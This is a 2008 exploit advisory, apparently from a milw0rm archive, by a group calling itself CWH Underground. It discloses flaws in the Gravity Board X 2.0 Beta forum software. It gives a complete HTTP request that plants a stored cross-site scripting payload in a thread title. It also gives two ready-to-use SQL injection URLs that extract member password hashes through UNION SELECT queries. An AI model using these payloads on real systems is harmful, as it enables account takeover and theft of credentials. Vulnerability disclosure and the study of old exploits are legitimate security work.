@@ -1,0 +1,67 @@
+
+====================================================================
+ Gravity Board X 2.0 Beta (SQL/XSS) Multiple Remote Vulnerabilities
+====================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE : 12 June 2008
+SITE : www.citec.us
+
+
+#####################################################
+APPLICATION : Gravity Board X
+VERSION     : 2.0 Beta
+DOWNLOAD    : http://downloads.sourceforge.net/gbx
+#####################################################
+
++++ Remote Stored XSS Exploit +++
+
+    When you create new thread in forum, you can inject javascript in title field.
+
+-----
+ POC
+-----
+
+[+]POST http://192.168.0.4/gbx/index.php?action=postnewsubmit&board_id=1 HTTP/1.1
+[+]Host: 192.168.0.4
+[+]User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14
+[+]Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+[+]Accept-Language: en-us,en;q=0.5
+[+]Accept-Encoding: gzip,deflate
+[+]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+[+]Keep-Alive: 300
+[+]Connection: keep-alive
+[+]Referer: http://127.0.0.1/gbx/index.php?action=postnew&board_id=1
+[+]Cookie: PHPSESSID=507c211a3be817f7e7fcf51b3886665a
+[+]Content-Type: application/x-www-form-urlencoded
+[+]Content-Length: 128
+[+]subject=POC+%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E&FCKeditorContents=POC+XSS+Thread&formsent=&board_id=1&submit=Post
+
++++ Remote SQL Injection Exploit +++
+
+** magic_quotes_gpc = Off **
+
+-------------
+ POC Exploit
+-------------
+
+[+]http://[target]/[gbx_path]/index.php?action=getsearch&orderby=dateposted&searchquery=')/**/union/**/select/**/pw/**/from/**/gbx_members/**/where/**/memberid=1/*&byuser=&searchin=submess
+[+]http://[target]/[gbx_path]/index.php?action=viewboard&board_id=1'/**/union/**/select/**/1,pw,3/**/from/**/gbx_members/*
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-12]
